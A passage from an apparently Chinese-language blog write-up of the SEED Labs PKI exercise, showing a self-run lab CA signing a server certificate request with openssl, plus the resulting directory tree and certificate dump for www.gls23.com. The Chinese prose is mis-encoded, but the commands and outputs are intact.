class="hljs-number">4</span><span class="hljs-attribute">c</span>:<span class="hljs-number">8</span><span class="hljs-attribute">d</span>:<span class="hljs-number">19</span>:f1:<span class="hljs-number">57</span>:<span class="hljs-number">7</span><span class="hljs-attribute">e</span>:<span class="hljs-number">6</span><span class="hljs-attribute">c</span>:<span class="hljs-number">57</span>:<span class="hljs-number">3</span><span class="hljs-attribute">d</span>:d6:a9:<span class="hljs-number">89</span>:<span class="hljs-attribute">ad</span>:<br>         <span class="hljs-attribute">cb</span>:<span class="hljs-attribute">cb</span>:<span class="hljs-number">37</span>:c5:<span class="hljs-number">44</span>:<span class="hljs-number">00</span>:c2:<span class="hljs-number">31</span>:<span class="hljs-attribute">cc</span>:<span class="hljs-number">64</span>:a8:<span class="hljs-number">2</span><span class="hljs-attribute">b</span>:<span class="hljs-number">51</span>:<span class="hljs-attribute">ca</span>:<span class="hljs-number">9</span><span class="hljs-attribute">d</span>:<span class="hljs-number">9</span><span class="hljs-attribute">b</span>:<span class="hljs-number">04</span>:d0:<br>         b0:<span class="hljs-number">07</span>:c9:c8:f6:<span class="hljs-attribute">fc</span>:<span class="hljs-number">56</span>:<span class="hljs-attribute">ba</span>:<span class="hljs-number">0</span><span class="hljs-attribute">c</span>:c7:b2:<span class="hljs-attribute">bb</span>:<span class="hljs-attribute">aa</span>:<span class="hljs-number">3</span><span class="hljs-attribute">c</span>:<span class="hljs-number">98</span>:<span class="hljs-number">15</span>:e8:<span class="hljs-number">3</span><span class="hljs-attribute">f</span>:<br>         <span class="hljs-number">8</span><span class="hljs-attribute">f</span>:<span class="hljs-number">4</span><span class="hljs-attribute">d</span>:<span class="hljs-attribute">bc</span>:<span class="hljs-number">4</span><span class="hljs-attribute">e</span>:d5:<span class="hljs-number">32</span>:<span class="hljs-number">41</span>:<span class="hljs-number">69</span>:d5:<span class="hljs-number">83</span>:<span class="hljs-number">6</span><span class="hljs-attribute">f</span>:<span class="hljs-number">8</span><span class="hljs-attribute">c</span>:<span class="hljs-number">68</span>:<span class="hljs-attribute">bd</span>:c1:<span class="hljs-number">22</span>:<span class="hljs-number">35</span>:<span class="hljs-number">9</span><span class="hljs-attribute">a</span>:<br>         <span class="hljs-attribute">fa</span>:<span class="hljs-number">3</span><span class="hljs-attribute">a</span>:<span class="hljs-number">71</span>:<span class="hljs-number">22</span>:c1:<span class="hljs-number">71</span>:<span class="hljs-number">5</span><span class="hljs-attribute">a</span>:<span class="hljs-number">39</span>:<span class="hljs-number">5</span><span class="hljs-attribute">d</span>:<span class="hljs-number">0</span><span class="hljs-attribute">b</span>:<span class="hljs-number">13</span>:<span class="hljs-number">4</span><span class="hljs-attribute">c</span>:d4:<span class="hljs-attribute">bb</span>:d5:b4:d2:<span class="hljs-attribute">eb</span>:<br>         <span class="hljs-attribute">be</span>:e7:<span class="hljs-number">53</span>:c4:<span class="hljs-number">50</span>:<span class="hljs-attribute">da</span>:<span class="hljs-number">77</span>:<span class="hljs-number">00</span>:<span class="hljs-number">23</span>:<span class="hljs-number">14</span>:<span class="hljs-number">86</span>:a6:<span class="hljs-number">98</span>:<span class="hljs-attribute">cd</span>:<span class="hljs-number">80</span>:<span class="hljs-number">9</span><span class="hljs-attribute">d</span>:<span class="hljs-number">4</span><span class="hljs-attribute">b</span>:b7:<br>         <span class="hljs-number">51</span>:<span class="hljs-number">1</span><span class="hljs-attribute">b</span>:f1:<span class="hljs-number">81</span>:<span class="hljs-number">48</span>:e5:<span class="hljs-number">1</span><span class="hljs-attribute">c</span>:<span class="hljs-number">3</span><span class="hljs-attribute">c</span>:<span class="hljs-attribute">dc</span>:f2:<span class="hljs-number">5</span><span class="hljs-attribute">a</span>:b7:a4:<span class="hljs-number">43</span>:a3:<span class="hljs-number">5</span><span class="hljs-attribute">b</span>:<span class="hljs-attribute">ad</span>:<span class="hljs-attribute">bf</span>:<br>         <span class="hljs-number">7</span><span class="hljs-attribute">f</span>:<span class="hljs-number">66</span>:<span class="hljs-number">59</span>:<span class="hljs-attribute">cc</span>:<span class="hljs-number">12</span>:<span class="hljs-attribute">ca</span>:<span class="hljs-number">23</span>:c0:a1:<span class="hljs-attribute">da</span>:<span class="hljs-number">38</span>:<span class="hljs-attribute">ff</span>:c1:e8:<span class="hljs-number">78</span>:<span class="hljs-attribute">cd</span>:b5:<span class="hljs-number">5</span><span class="hljs-attribute">f</span>:<br>         <span class="hljs-number">43</span>:e8:<span class="hljs-number">82</span>:<span class="hljs-number">4</span><span class="hljs-attribute">f</span>:d3:<span class="hljs-number">76</span>:a9:<span class="hljs-number">3</span><span class="hljs-attribute">e</span>:e2:<span class="hljs-number">54</span>:<span class="hljs-attribute">ad</span>:<span class="hljs-number">85</span>:<span class="hljs-number">66</span>:<span class="hljs-number">18</span>:<span class="hljs-attribute">da</span>:<span class="hljs-number">19</span>:<span class="hljs-attribute">bd</span>:c4:<br>         <span class="hljs-number">5</span><span class="hljs-attribute">b</span>:f7:f2:<span class="hljs-number">53</span>:<span class="hljs-number">13</span>:<span class="hljs-attribute">ea</span>:<span class="hljs-number">44</span>:<span class="hljs-number">73</span>:<span class="hljs-attribute">be</span>:<span class="hljs-attribute">bb</span>:<span class="hljs-number">8</span><span class="hljs-attribute">a</span>:<span class="hljs-attribute">cb</span>:<span class="hljs-number">7</span><span class="hljs-attribute">c</span>:<span class="hljs-number">20</span>:<span class="hljs-number">18</span>:b2:<span class="hljs-number">65</span>:<span class="hljs-number">96</span>:<br>         <span class="hljs-number">24</span>:<span class="hljs-number">22</span>:<span class="hljs-number">43</span>:<span class="hljs-attribute">ab</span>:<span class="hljs-number">5</span><span class="hljs-attribute">f</span>:<span class="hljs-number">11</span>:<span class="hljs-number">62</span>:<span class="hljs-number">18</span>:<span class="hljs-number">4</span><span class="hljs-attribute">f</span>:<span class="hljs-number">7</span><span class="hljs-attribute">f</span>:<span class="hljs-number">3</span><span class="hljs-attribute">a</span>:b6:<span class="hljs-number">47</span>:e1:f2:<span class="hljs-number">70</span>:<span class="hljs-number">9</span><span class="hljs-attribute">d</span>:<span class="hljs-number">95</span>:<br>         <span class="hljs-number">3</span><span class="hljs-attribute">c</span>:<span class="hljs-attribute">eb</span>:<span class="hljs-attribute">aa</span>:d5:<span class="hljs-number">0</span><span class="hljs-attribute">a</span>:<span class="hljs-number">5</span><span class="hljs-attribute">c</span>:d9:<span class="hljs-number">0</span><span class="hljs-attribute">d</span>:<span class="hljs-number">83</span>:<span class="hljs-number">7</span><span class="hljs-attribute">f</span>:d0:<span class="hljs-attribute">bd</span>:<span class="hljs-attribute">ae</span>:b4:<span class="hljs-number">76</span>:a3:a8:a6:<br>         <span class="hljs-number">7</span><span class="hljs-attribute">f</span>:<span class="hljs-number">94</span>:<span class="hljs-number">0</span><span class="hljs-attribute">f</span>:<span class="hljs-number">4</span><span class="hljs-attribute">f</span>:<span class="hljs-number">8</span><span class="hljs-attribute">a</span>:<span class="hljs-number">41</span>:<span class="hljs-number">7</span><span class="hljs-attribute">e</span>:e7:<span class="hljs-attribute">fe</span>:<span class="hljs-number">9</span><span class="hljs-attribute">c</span>:<span class="hljs-attribute">bc</span>:<span class="hljs-attribute">ee</span>:<span class="hljs-number">06</span>:<span class="hljs-number">67</span>:<span class="hljs-number">10</span>:<span class="hljs-number">60</span>:<span class="hljs-number">57</span>:<span class="hljs-number">58</span>:<br>         c1:<span class="hljs-number">78</span>:c7:<span class="hljs-number">65</span>:f3:<span class="hljs-number">5</span><span class="hljs-attribute">e</span>:<span class="hljs-number">52</span>:<span class="hljs-number">1</span><span class="hljs-attribute">c</span>:<span class="hljs-number">02</span>:<span class="hljs-number">5</span><span class="hljs-attribute">e</span>:f8:<span class="hljs-number">98</span>:<span class="hljs-number">9</span><span class="hljs-attribute">c</span>:<span class="hljs-number">05</span>:<span class="hljs-number">58</span>:<span class="hljs-number">73</span>:b0:c0:<br>         <span class="hljs-number">56</span>:<span class="hljs-number">82</span>:<span class="hljs-number">52</span>:<span class="hljs-number">34</span><br><br></code></pre></td></tr></table></figure><h1 id="Task-3-Generating-a-Certificate-for-your-server"><a href="#Task-3-Generating-a-Certificate-for-your-server" class="headerlink" title="Task 3: Generating a Certificate for your server"></a>Task 3: Generating a Certificate for your server</h1><p>CSR æ–‡ä»¶éœ€è¦æœ‰ CA çš„ç­¾åæ‰èƒ½å½¢æˆè¯ä¹¦ã€‚åœ¨ç°å®ä¸–ç•Œä¸­ï¼ŒCSR æ–‡ä»¶é€šå¸¸è¢«å‘é€åˆ°å—ä¿¡ä»»çš„ CA ä»¥è·å¾—ç­¾åã€‚åœ¨è¿™ä¸ªlabä¸­ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨æˆ‘ä»¬è‡ªå·±çš„å¯ä¿¡ CA æ¥ç”Ÿæˆè¯ä¹¦ã€‚ä¸‹é¢çš„å‘½ä»¤ä½¿ç”¨ CA çš„ CA.crt å’Œ CA.key å°†è¯ä¹¦ç­¾åè¯·æ±‚(server.csr)è½¬æ¢ä¸º X509è¯ä¹¦(server.crt) :</p><p>æ³¨æ„æˆ‘çš„é…ç½®æ–‡ä»¶åœ¨./my_openssl.cnf</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs shell">[06/22/23]seed@VM:~/CA$ openssl ca -config ./my_openssl.cnf -policy policy_anything \<br><span class="hljs-meta">&gt;</span><span class="bash"> -md sha256 -days 3650 \</span><br><span class="bash">&gt; -<span class="hljs-keyword">in</span> server.csr -out server.crt -batch \</span><br><span class="bash">&gt; -cert ./ca.crt -keyfile ./ca.key</span><br>Using configuration from ./my_openssl.cnf<br>Enter pass phrase for ./ca.key:<br>Check that the request matches the signature<br>Signature ok<br>Certificate Details:<br>        Serial Number: 4096 (0x1000)<br>        Validity<br>            Not Before: Jun 22 14:34:08 2023 GMT<br>            Not After : Jun 19 14:34:08 2033 GMT<br>        Subject:<br>            countryName               = US<br>            organizationName          = gls23 Inc.<br>            commonName                = www.gls23.com<br>        X509v3 extensions:<br>            X509v3 Basic Constraints: <br>                CA:FALSE<br>            Netscape Comment: <br>                OpenSSL Generated Certificate<br>            X509v3 Subject Key Identifier: <br>                53:6B:EA:44:75:F5:0D:AE:C1:B7:01:67:E5:E5:0C:EF:42:0E:9F:57<br>            X509v3 Authority Key Identifier: <br>                keyid:85:43:B9:78:0E:00:2C:30:DB:49:AC:E4:00:03:EF:B3:E0:D8:AD:49<br><br>            X509v3 Subject Alternative Name: <br>                DNS:www.gls2023.com, DNS:www.gls2024.com<br>Certificate is to be certified until Jun 19 14:34:08 2033 GMT (3650 days)<br><br>Write out database with 1 new entries<br>Data Base Updated<br><br></code></pre></td></tr></table></figure><p>æ‰§è¡Œä¹‹åï¼Œæ–‡ä»¶å‡ºç°äº†å˜åŒ–</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs shell">[06/22/23]seed@VM:~/CA$ tree .<br>.<br>â”œâ”€â”€ ca.crt<br>â”œâ”€â”€ ca.key<br>â”œâ”€â”€ demoCA<br>â”‚   â”œâ”€â”€ certs<br>â”‚   â”œâ”€â”€ crl<br>â”‚   â”œâ”€â”€ index.txt<br>â”‚   â”œâ”€â”€ index.txt.attr<br>â”‚   â”œâ”€â”€ index.txt.attr.old<br>â”‚   â”œâ”€â”€ index.txt.old<br>â”‚   â”œâ”€â”€ newcerts<br>â”‚   â”‚   â”œâ”€â”€ 1000.pem<br>â”‚   â”‚   â””â”€â”€ 1001.pem<br>â”‚   â”œâ”€â”€ serial<br>â”‚   â””â”€â”€ serial.old<br>â”œâ”€â”€ my_openssl.cnf<br>â”œâ”€â”€ server.crt<br>â”œâ”€â”€ server.csr<br>â””â”€â”€ server.key<br><br>4 directories, 14 files<br><br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹ä¸€ä¸‹server.crt</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-selector-attr">[06/22/23]</span>seed<span class="hljs-keyword">@VM</span>:~/CA$ openssl x509 -in server.crt -text -noout<br><span class="hljs-attribute">Certificate</span>:<br>    <span class="hljs-attribute">Data</span>:<br>        <span class="hljs-attribute">Version</span>: <span class="hljs-number">3</span> (<span class="hljs-number">0</span>x2)<br>        Serial <span class="hljs-attribute">Number</span>: <span class="hljs-number">4097</span> (<span class="hljs-number">0</span>x1001)<br>        Signature <span class="hljs-attribute">Algorithm</span>: sha256WithRSAEncryption<br>        <span class="hljs-attribute">Issuer</span>: CN = www.modelCA.com, O = Model CA LTD., C = US<br>        Validity<br>            <span class="hljs-keyword">Not</span> <span class="hljs-attribute">Before</span>: Jun <span class="hljs-number">22</span> <span class="hljs-number">14</span>:<span class="hljs-number">54</span>:<span class="hljs-number">43</span> <span class="hljs-number">2023</span> GMT<br>            <span class="hljs-keyword">Not</span> After : Jun <span class="hljs-number">19</span> <span class="hljs-number">14</span>:<span class="hljs-number">54</span>:<span class="hljs-number">43</span> <span class="hljs-number">2033</span> GMT<br>        <span class="hljs-attribute">Subject</span>: C = US, O = gls23 Inc., CN = www.gls23.com<br>        Subject Public Key <span class="hljs-attribute">Info</span>:<br>            Public Key <span class="hljs-attribute">Algorithm</span>: rsaEncryption<br>                RSA <span class="hljs-attribute">Public-Key</span>: (<span class="hljs-number">2048</span> bit)<br>                <span class="hljs-attribute">Modulus</span>:<br>                    <span class="hljs-number">00</span>:<span class="hljs-number">95</span>:<span class="hljs-number">72</span>:<span class="hljs-number">09</span>:<span class="hljs-number">22</span>:<span class="hljs-number">45</span>:<span class="hljs-number">48</span>:<span class="hljs-number">33</span>:<span class="hljs-number">58</span>:<span class="hljs-number">7</span><span class="hljs-attribute">a</span>:a3:<span class="hljs-number">9</span><span class="hljs-attribute">b</span>:<span class="hljs-number">27</span>:d5:d8:<br>                    a0:e2:<span class="hljs-number">3</span><span class="hljs-attribute">d</span>:<span class="hljs-number">5</span><span class="hljs-attribute">f</span>:<span class="hljs-number">87</span>:<span class="hljs-number">86</span>:<span class="hljs-number">7</span><span class="hljs-attribute">a</span>:<span class="hljs-number">10</span>:d7:<span class="hljs-number">40</span>:a2:<span class="hljs-number">94</span>:<span class="hljs-number">6</span><span class="hljs-attribute">c</span>:c6:<span class="hljs-number">0</span><span class="hljs-attribute">e</span>:<br>                    <span class="hljs-number">84</span>:<span class="hljs-attribute">ff</span>:e4:<span class="hljs-number">61</span>:<span class="hljs-number">10</span>:<span class="hljs-number">9</span><span class="hljs-attribute">c</span>:<span class="hljs-attribute">fe</span>:f4:a9:<span class="hljs-number">90</span>:<span class="hljs-number">09</span>:c1:a1:d3:<span class="hljs-number">7</span><span class="hljs-attribute">a</span>:<br>                    <span class="hljs-number">59</span>:<span class="hljs-number">10</span>:<span class="hljs-number">9</span><span class="hljs-attribute">a</span>:<span class="hljs-number">2</span><span class="hljs-attribute">e</span>:<span class="hljs-attribute">eb</span>:e2:<span class="hljs-number">29</span>:<span class="hljs-number">9</span><span class="hljs-attribute">c</span>:<span class="hljs-number">04</span>:<span class="hljs-attribute">cc</span>:<span class="hljs-number">48</span>:<span class="hljs-number">17</span>:e4:<span class="hljs-number">1</span><span class="hljs-attribute">b</span>:<span class="hljs-number">06</span>:<br>                    b2:<span class="hljs-number">28</span>:d7:d3:f5:<span class="hljs-number">88</span>:<span class="hljs-number">0</span><span class="hljs-attribute">c</span>:<span class="hljs-number">08</span>:<span class="hljs-attribute">ea</span>:c8:<span class="hljs-attribute">ad</span>:<span class="hljs-number">6</span><span class="hljs-attribute">d</span>:e5:<span class="hljs-attribute">eb</span>:<span class="hljs-number">20</span>:<br>                    f5:<span class="hljs-number">9</span><span class="hljs-attribute">d</span>:<span class="hljs-number">2</span><span class="hljs-attribute">b</span>:<span class="hljs-number">33</span>:<span class="hljs-attribute">bc</span>:<span class="hljs-attribute">ce</span>:<span class="hljs-number">36</span>:<span class="hljs-number">7</span><span class="hljs-attribute">a</span>:c8:<span class="hljs-number">7</span><span class="hljs-attribute">c</span>:<span class="hljs-number">21</span>:<span class="hljs-number">10</span>:<span class="hljs-number">97</span>:<span class="hljs-number">2</span><span class="hljs-attribute">e</span>:<span class="hljs-number">27</span>:<br>                    <span class="hljs-attribute">ea</span>:<span class="hljs-number">24</span>:<span class="hljs-number">5</span><span class="hljs-attribute">b</span>:<span class="hljs-number">5</span><span class="hljs-attribute">b</span>:<span class="hljs-number">07</span>:f6:d9:<span class="hljs-number">90</span>:<span class="hljs-number">1</span><span class="hljs-attribute">d</span>:<span class="hljs-number">8</span><span class="hljs-attribute">f</span>:<span class="hljs-attribute">bf</span>:b6:<span class="hljs-number">00</span>:<span class="hljs-number">3</span><span class="hljs-attribute">a</span>:c9:<br>                    <span class="hljs-number">0</span><span class="hljs-attribute">e</span>:<span class="hljs-number">37</span>:<span class="hljs-number">58</span>:<span class="hljs-attribute">ca</span>:<span class="hljs-number">0</span><span class="hljs-attribute">c</span>:<span class="hljs-number">30</span>:<span class="hljs-number">18</span>:b3:<span class="hljs-number">20</span>:<span class="hljs-number">0</span><span class="hljs-attribute">f</span>:<span class="hljs-number">45</span>:<span class="hljs-number">01</span>:<span class="hljs-number">99</span>:<span class="hljs-number">78</span>:<span class="hljs-attribute">ce</span>:<br>                    <span class="hljs-number">81</span>:b8:<span class="hljs-number">56</span>:<span class="hljs-number">93</span>:<span class="hljs-number">29</span>:<span class="hljs-number">58</span>:<span class="hljs-number">3</span><span class="hljs-attribute">c</span>:<span class="hljs-attribute">ea</span>:e9:<span class="hljs-number">7</span><span class="hljs-attribute">d</span>:a7:<span class="hljs-attribute">cf</span>:d9:f4:<span class="hljs-attribute">dc</span>:<br>                    <span class="hljs-number">37</span>:<span class="hljs-number">58</span>:<span class="hljs-number">75</span>:<span class="hljs-number">34</span>:a6:a5:<span class="hljs-number">9</span><span class="hljs-attribute">b</span>:a5:<span class="hljs-number">1</span><span class="hljs-attribute">f</span>:<span class="hljs-number">64</span>:a0:<span class="hljs-number">70</span>:<span class="hljs-attribute">ca</span>:b7:<span class="hljs-number">24</span>:<br>                    <span class="hljs-number">1</span><span class="hljs-attribute">a</span>:<span class="hljs-number">50</span>:f9:<span class="hljs-number">6</span><span class="hljs-attribute">f</span>:<span class="hljs-number">64</span>:<span class="hljs-number">3</span><span class="hljs-attribute">a</span>:<span class="hljs-number">30</span>:<span class="hljs-number">80</span>:<span class="hljs-number">89</span>:a1:<span class="hljs-attribute">dc</span>:<span class="hljs-attribute">fc</span>:<span class="hljs-number">72</span>:<span class="hljs-attribute">ce</span>:<span class="hljs-number">24</span>:<br>                    <span class="hljs-number">49</span>:<span class="hljs-attribute">eb</span>:c8:b6:<span class="hljs-number">5</span><span class="hljs-attribute">d</span>:b4:e5:<span class="hljs-attribute">bd</span>:f5:<span class="hljs-number">45</span>:<span class="hljs-number">8</span><span class="hljs-attribute">d</span>:c4:a7:c3:e8:<br>                    b2:<span class="hljs-number">28</span>:c2:b4:e3:<span class="hljs-number">7</span><span class="hljs-attribute">e</span>:<span class="hljs-number">8</span><span class="hljs-attribute">a</span>:<span class="hljs-number">48</span>:<span class="hljs-number">75</span>:b3:<span class="hljs-number">81</span>:<span class="hljs-attribute">ab</span>:<span class="hljs-attribute">bc</span>:<span class="hljs-number">0</span><span class="hljs-attribute">f</span>:<span class="hljs-number">6</span><span class="hljs-attribute">d</span>:<br>                    <span class="hljs-number">43</span>:<span class="hljs-number">3</span><span class="hljs-attribute">c</span>:d8:<span class="hljs-number">9</span><span class="hljs-attribute">e</span>:<span class="hljs-number">15</span>:<span class="hljs-number">17</span>:<span class="hljs-attribute">ee</span>:<span class="hljs-number">5</span><span class="hljs-attribute">c</span>:<span class="hljs-number">61</span>:<span class="hljs-number">1</span><span class="hljs-attribute">d</span>:e7:<span class="hljs-number">76</span>:<span class="hljs-number">27</span>:<span class="hljs-number">31</span>:<span class="hljs-number">38</span>:<br>                    <span class="hljs-number">66</span>:<span class="hljs-number">47</span>:<span class="hljs-number">68</span>:<span class="hljs-number">85</span>:e7:b2:<span class="hljs-number">80</span>:<span class="hljs-attribute">fd</span>:e1:<span class="hljs-number">98</span>:<span class="hljs-number">36</span>:<span class="hljs-number">70</span>:<span class="hljs-number">12</span>:<span class="hljs-number">8</span><span class="hljs-attribute">e</span>:<span class="hljs-attribute">ad</span>:<br>                    <span class="hljs-number">85</span>:<span class="hljs-number">00</span>:<span class="hljs-attribute">fc</span>:<span class="hljs-number">45</span>:<span class="hljs-number">1</span><span class="hljs-attribute">b</span>:<span class="hljs-attribute">fe</span>:<span class="hljs-number">72</span>:<span class="hljs-number">6</span><span class="hljs-attribute">b</span>:e9:<span class="hljs-number">2</span><span class="hljs-attribute">e</span>:<span class="hljs-number">3</span><span class="hljs-attribute">f</span>:e6:<span class="hljs-number">6</span><span class="hljs-attribute">f</span>:b1:<span class="hljs-number">45</span>:<br>                    <span class="hljs-number">95</span>:<span class="hljs-attribute">af</span>:<span class="hljs-number">6</span><span class="hljs-attribute">c</span>:<span class="hljs-number">21</span>:<span class="hljs-number">14</span>:<span class="hljs-number">1</span><span class="hljs-attribute">b</span>:<span class="hljs-number">64</span>:<span class="hljs-number">3</span><span class="hljs-attribute">a</span>:f8:<span class="hljs-number">87</span>:<span class="hljs-number">34</span>:<span class="hljs-number">28</span>:b1:<span class="hljs-number">91</span>:<span class="hljs-number">2</span><span class="hljs-attribute">a</span>:<br>                    <span class="hljs-number">2</span><span class="hljs-attribute">f</span>:<span class="hljs-number">3</span>d<br>                <span class="hljs-attribute">Exponent</span>: <span class="hljs-number">65537</span> (<span class="hljs-number">0</span>x10001)<br>        X509v3 <span class="hljs-attribute">extensions</span>:<br>            X509v3 Basic <span class="hljs-attribute">Constraints</span>: <br>                <span class="hljs-attribute">CA</span>:FALSE<br>            Netscape <span class="hljs-attribute">Comment</span>: <br>                OpenSSL Generated Certificate<br>            X509v3 Subject Key <span class="hljs-attribute">Identifier</span>: <br>                <span class="hljs-number">53</span>:<span class="hljs-number">6</span><span class="hljs-attribute">B</span>:<span class="hljs-attribute">EA</span>:<span class="hljs-number">44</span>:<span class="hljs-number">75</span>:F5:<span class="hljs-number">0</span><span class="hljs-attribute">D</span>:<span class="hljs-attribute">AE</span>:C1:B7:<span class="hljs-number">01</span>:<span class="hljs-number">67</span>:E5:E5:<span class="hljs-number">0</span><span class="hljs-attribute">C</span>:<span class="hljs-attribute">EF</span>:<span class="hljs-number">42</span>:<span class="hljs-number">0</span><span class="hljs-attribute">E</span>:<span class="hljs-number">9</span><span class="hljs-attribute">F</span>:<span class="hljs-number">57</span><br>            X509v3 Authority Key <span class="hljs-attribute">Identifier</span>: <br>                <span class="hljs-attribute">keyid</span>:<span class="hljs-number">85</span>:<span class="hljs-number">43</span>:B9:<span class="hljs-number">78</span>:<span class="hljs-number">0</span><span class="hljs-attribute">E</span>:<span class="hljs-number">00</span>:<span class="hljs-number">2</span><span class="hljs-attribute">C</span>:<span class="hljs-number">30</span>:<span class="hljs-attribute">DB</span>:<span class="hljs-number">49</span>:<span class="hljs-attribute">AC</span>:E4:<span class="hljs-number">00</span>:<span class="hljs-number">03</span>:<span class="hljs-attribute">EF</span>:B3:E0:D8:<span class="hljs-attribute">AD</span>:<span class="hljs-number">49</span><br><br>            X509v3 Subject Alternative <span class="hljs-attribute">Name</span>: <br>                <span class="hljs-attribute">DNS</span>:www.gls2023.com, <span class="hljs-attribute">DNS</span>:www.gls2024.com<br>    Signature <span class="hljs-attribute">Algorithm</span>: sha256WithRSAEncryption<br>         <span class="hljs-number">62</span>:b0:a6:<span class="hljs-number">8</span><span class="hljs-attribute">a</span>:<span class="hljs-number">15</span>:<span class="hljs-number">35</span>:b4:<span class="hljs-number">8</span><span class="hljs-attribute">f</span>:<span class="hljs-number">5</span><span class="hljs-attribute">f</span>:<span class="hljs-number">1</span><span class="hljs-attribute">a</span>:<span class="hljs-number">18</span>:<span class="hljs-number">89</span>:d2:<span class="hljs-number">32</span>:<span class="hljs-number">6</span><span class="hljs-attribute">e</span>:<span class="hljs-number">10</span>:<span class="hljs-number">6</span><span class="hljs-attribute">f</span>:<span class="hljs-number">19</span>:<br>         <span class="hljs-number">85</span>:<span class="hljs-number">39</span>:c1:<span class="hljs-attribute">ca</span>:<span class="hljs-number">49</span>:<span class="hljs-number">0</span><span class="hljs-attribute">e</span>:d4:f0:a6:<span class="hljs-number">85</span>:b9:<span class="hljs-attribute">ac</span>:<span class="hljs-number">0</span><span class="hljs-attribute">b</span>:<span class="hljs-number">7</span><span class="hljs-attribute">a</span>:<span class="hljs-number">8</span><span class="hljs-attribute">c</span>:<span class="hljs-number">11</span>:<span class="hljs-number">19</span>:<span class="hljs-number">66</span>:<br>         <span class="hljs-number">7</span><span class="hljs-attribute">f</span>:<span class="hljs-number">9</span><span class="hljs-attribute">d</span>:<span class="hljs-attribute">af</span>:<span class="hljs-number">1</span><span class="hljs-attribute">d</span>:<span class="hljs-number">1</span><span class="hljs-attribute">c</span>:<span class="hljs-number">86</span>:<span class="hljs-number">60</span>:e6:f5:<span class="hljs-attribute">ac</span>:<span class="hljs-number">70</span>:<span class="hljs-number">5</span><span class="hljs-attribute">a</span>:<span class="hljs-attribute">ba</span>:f7:<span class="hljs-number">1</span><span class="hljs-attribute">e</span>:e1:<span class="hljs-number">65</span>:<span class="hljs-number">21</span>:<br>         <span class="hljs-number">31</span>:<span class="hljs-number">4</span><span class="hljs-attribute">d</span>:<span class="hljs-attribute">fe</span>:<span class="hljs-number">33</span>:<span class="hljs-number">74</span>:<span class="hljs-number">64</span>:<span class="hljs-number">16</span>:<span class="hljs-number">66</span>:<span class="hljs-number">9</span><span class="hljs-attribute">a</span>:<span class="hljs-number">2</span><span class="hljs-attribute">b</span>:<span class="hljs-number">02</span>:<span class="hljs-number">74</span>:<span class="hljs-attribute">cf</span>:e3:<span class="hljs-number">93</span>:<span class="hljs-attribute">af</span>:<span class="hljs-number">1</span><span class="hljs-attribute">f</span>:<span class="hljs-number">86</span>:<br>         <span class="hljs-number">05</span>:<span class="hljs-attribute">db</span>:<span class="hljs-number">84</span>:<span class="hljs-number">34</span>:<span class="hljs-number">7</span><span class="hljs-attribute">f</span>:<span class="hljs-number">73</span>:<span class="hljs-number">69</span>:<span class="hljs-number">3</span><span class="hljs-attribute">c</span>:d1:<span class="hljs-attribute">be</span>:f3:f5:<span class="hljs-number">0</span><span class="hljs-attribute">f</span>:<span class="hljs-number">8</span><span class="hljs-attribute">e</span>:e8:<span class="hljs-number">98</span>:<span class="hljs-attribute">bf</span>:<span class="hljs-number">5</span><span class="hljs-attribute">b</span>:<br>         <span class="hljs-number">5</span><span class="hljs-attribute">c</span>:<span class="hljs-number">55</span>:<span class="hljs-number">73</span>:<span class="hljs-number">33</span>:<span class="hljs-number">09</span>:<span 